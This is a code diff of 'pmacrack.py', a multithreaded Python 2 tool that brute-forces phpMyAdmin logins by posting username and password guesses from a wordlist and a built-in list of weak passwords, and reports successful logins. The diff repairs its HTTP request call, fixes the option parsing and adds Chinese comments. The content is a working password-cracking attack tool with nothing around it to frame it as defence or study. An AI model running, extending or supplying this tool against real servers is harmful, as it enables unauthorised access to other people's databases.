@@ -8,6 +8,7 @@ import threading,sys
 import time
 import re
 import httplib
+import requests
 import cStringIO
 from Queue import  Queue
 import platform
@@ -16,6 +17,7 @@ import signal
 
 
 '''
+解决在Windows下乱码问题
 '''
 class UnicodeStreamFilter:
     def __init__(self, target):
@@ -32,6 +34,9 @@ class UnicodeStreamFilter:
 if sys.stdout.encoding == 'cp936':
     sys.stdout = UnicodeStreamFilter(sys.stdout)
 
+
+
+
 mutex = threading.RLock()
 existsurl=[]
 is_exit=False
@@ -40,6 +45,11 @@ timeout=10
 socket.setdefaulttimeout(timeout)
 MAXSIZE = 50000
 
+
+
+'''
+如果是Windows系统，导入cmd下的颜色库ctypes
+'''
 if platform.system()=='Windows':
 
             STD_INPUT_HANDLE = -10
@@ -90,6 +100,12 @@ if platform.system()=='Windows':
                         self.reset_color()
 
 
+
+
+'''
+非Windows下的字体颜色设置
+'''
+
 class ColorOtherOS:
         def __init__(self):
             self.HEADER = '\033[95m'
@@ -98,6 +114,7 @@ class ColorOtherOS:
             self.WARNING = '\033[93m'
             self.FAIL = '\033[91m'
             self.ENDC = '\033[0m'
+        #为了统一函数名字，所以将函数名写成red，其实是blue
         def print_red_text(self,print_text):
             print self.OKBLUE+print_text+self.ENDC
 
@@ -122,13 +139,13 @@ def readdic(path):
 def crack(url,user,pwd):
     pams = {'pma_username': user, 'pma_password': pwd}
     headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
-    r = urllib2.requests.post(url, headers = headers, data = pams)
+    r = requests.post(url, headers = headers, data = pams)
     if 'name="login_form"' not in r.content:
-	    existsurl.append("[*]  user:"+user+"    pwd:"+pwd + "-------------login sucess ![*]")
+	    existsurl.append("[*]  user:"+user+"/pwd:"+pwd + "-------------login sucess ![*]")
 		#print user+" login success ![*]"
-        #print '[*]  user:'+user+'  pwd:'+pwd + ' login sucess ![*]'
+        #print '[*]  user:'+user+'->pwd:'+pwd + ' login sucess ![*]'
     else:
-        print "[*]user:"+user+"    pwd:"+pwd + "-------------login fail ![*]"
+        print "[*]user:"+user+"/pwd:"+pwd + "-----------login fail ![*]"
 def social(url):
     Spwd=[]
     Supwd=['123','1234','12','12345','123123','123456','qaz','wsx','asd','asdf','qazwsx','1qaz','1qaz2wsx','111','db','pass','password',
@@ -155,7 +172,7 @@ def social(url):
 
 def usage():
     print '''
-      phpMyAdmin crack v1.0 code by hdbdl
+    phpmyadmin crack v1.0 code by 菜牛
 '''
     print "<Usage>: python pmacrack.py -u \"http://www.test.com/phpMyAdmin/\" [options]\n"
     print "[options]:"
@@ -164,8 +181,11 @@ def usage():
     print "          -t --thread   (threads)"
     print "<example>:"
     print "          python pmacrack.py -u \"http://www.test.com/\" -t 5 -p d:\\test.txt"
-    print "          python pmacrack.py -u \"http://www.test.com/\" -t 5 -p d:\\test.txt -n test"
+    print "          python pmacrack.py -u \"http://www.test.com/\" -t 5 -p d:\\test.txt -n \"test\""
     sys.exit()
+'''
+多线程类
+'''
 
 class MultiThread(threading.Thread):
     global is_exit
@@ -174,6 +194,8 @@ class MultiThread(threading.Thread):
         self.url=url
         self.sharedata=queue
         self.user=user
+
+
     def run(self):
         while self.sharedata.qsize()>0:
             if is_exit :
@@ -184,7 +206,9 @@ class MultiThread(threading.Thread):
                 murl='http://'+self.url
                 crack(murl,self.user,pwd)
 
-
+'''
+接受CTRL+C中断多线程信号，并设置退出全局变量
+'''
 def sigquit(a,b):
     global is_exit
     is_exit=True
@@ -201,7 +225,7 @@ else:
 if __name__=='__main__':
     url=threads=pwdfile=name=None
     try:
-         opts,args = getopt.getopt(sys.argv[1:],'u:t:p:n',['url=','thread=','pwdfile=','name='])
+         opts,args = getopt.getopt(sys.argv[1:],'u:t:p:n:',['url=','thread=','pwdfile=','name='])
     except getopt.GetoptError,e:
          usage()
     for opt,value in opts:
